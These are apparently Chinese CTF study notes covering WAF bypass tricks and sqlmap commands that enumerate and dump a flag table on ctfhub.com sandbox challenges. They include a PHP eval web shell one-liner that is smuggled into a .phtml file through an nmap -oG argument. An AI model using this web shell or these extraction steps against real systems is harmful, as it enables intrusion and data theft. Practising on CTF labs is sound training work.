...
8. 过waf
    ...
    4. 绕过 wakeup 见后面
    5. <?php 中php被过滤可使用 <?= @eval($_POST["pd"]);?> -oG pd.phtml '
...
常用方法
    ...
    1.查数据库
        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --dbs
        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --current-db
    2.查表名
        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 -D sqli --tables
    查字段
        python2 sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 -D sqli -T flag --columns
    4.查数据
        python sqlmap.py -u http://challenge-d20f8ccada64b868.sandbox.ctfhub.com:10080/?id=1 -D sqli -T flag -C flag --dump
